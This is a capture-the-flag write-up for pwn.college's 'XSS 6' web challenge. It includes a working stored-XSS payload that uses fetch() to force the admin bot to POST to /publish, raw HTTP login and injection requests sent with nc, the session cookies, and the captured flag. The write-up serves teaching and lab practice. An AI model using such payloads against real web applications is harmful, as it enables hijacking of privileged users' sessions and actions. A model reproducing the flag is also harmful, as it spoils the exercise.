---
layout: page
title: "🛡️ XSS 6 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 📁 Challenge Information

- **Category**: Web Exploitation
- **Challenge Name**: XSS 6
- **Platform**: pwn.college
- **Tags**: `Stored XSS`, `JavaScript`, `CSRF`, `Privilege Escalation`, `Session Abuse`

---

## 🔍 Description

This challenge builds on the previous XSS exercises but adds a twist: the `/publish` route now requires a **POST** request rather than a GET. This means the attack must simulate a **POST** request from the victim's browser using JavaScript.

---

## ⚙️ Application Behavior

### Login
- Auth via `/login` sets a session cookie

### Draft Post Submission
- Accessible at `/draft`
- `content` is inserted into the HTML without escaping

### Publish
- In XSS 5: `GET /publish`
- In XSS 6: now requires `POST /publish`
- Includes this form:
```html
<form action=publish method=post><input type=submit value="Publish All Drafts"></form>
```

### Vulnerable Rendering:
```python
page += post["content"]
```

User-controlled HTML is directly inserted and rendered—classic **stored XSS**.

---

## 🧪 Exploitation Plan

1. Login as `hacker`
2. Inject malicious JS that sends a `POST` request to `/publish`
3. Mark the post as published so the JS executes for visitors (e.g., the bot)
4. Trigger the bot to visit `/`
5. The admin's browser executes JS and submits a POST to `/publish`
6. Admin's draft (flag) is published
7. View the published post as `hacker`

---

## 🧨 Step-by-Step Exploit

### 1. Login as `hacker`

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```

✅ Session cookie from response:
```
session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH2V3g.DWCnjyhHpO2eh8uII1zrbxucvWs
```

---

### 2. Inject Stored XSS via `/draft`

Payload:
```html
<script>
fetch("http://challenge.localhost/publish", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "msg=OwnedByXSS"
})
</script>
```

Submit it:

```bash
printf 'POST /draft HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:179\r\nCookie:session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH2V3g.DWCnjyhHpO2eh8uII1zrbxucvWs\r\n\r\ncontent=<script>fetch("http://challenge.localhost/publish",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"msg=OwnedByXSS"})</script>&publish=on'| nc challenge.localhost 80
```

✔️ The post is **published** and will execute JS when visited by the victim.

---

### 3. Trigger Admin Visit

```bash
/challenge/victim
```

✔️ Admin bot visits the page and executes the `fetch()` JS, which sends a POST to `/publish`.

---

### 4. Re-login and View the Result

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```

New cookie from response:
```
session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH2WEQ.JY8MoZM_5zzfs4-M6SFvmo1dp5c
```

Check if it worked:

```bash
curl -b "session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH2WEQ.JY8MoZM_5zzfs4-M6SFvmo1dp5c" http://challenge.localhost/
```

✅ Output includes:

```html
<h2>Author: admin</h2>pwn.college{YHfdoNx7kPHkKQzkkUPm3t3twX9.QXwgTN2wSM0IzMyEzW}
```

---

## 🏁 Flag

```
pwn.college{YHfdoNx7kPHkKQzkkUPm3t3twX9.QXwgTN2wSM0IzMyEzW}
```

---


